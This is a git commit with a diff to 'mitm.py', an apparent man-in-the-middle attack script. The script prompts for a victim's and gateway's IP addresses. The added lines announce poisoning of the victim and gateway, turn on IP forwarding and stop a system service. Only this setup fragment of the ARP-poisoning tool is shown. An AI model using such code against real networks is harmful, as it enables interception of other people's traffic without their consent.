93d39d36a6ba62242c065e2308d801bb7fe65ae9
deeghayu <deefernando6@gmail.com>
2021-07-23 09:22:19 +0530

    Update mitm.py

--- mitm.py
+++ mitm.py
@@ -7,3 +7,7 @@ print("Are you run with root previledges? ")
 VIP = input("Enter the IP address of the victim: ")
 GW = input("Enter the IP address of the gateway: ")
 IFACE = input("Enter the name of the interface (ex: eth0): ")
+
+print("\tPoisoning victim machine & gateway.........")
+os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
+os.system('service whoopsie stop')
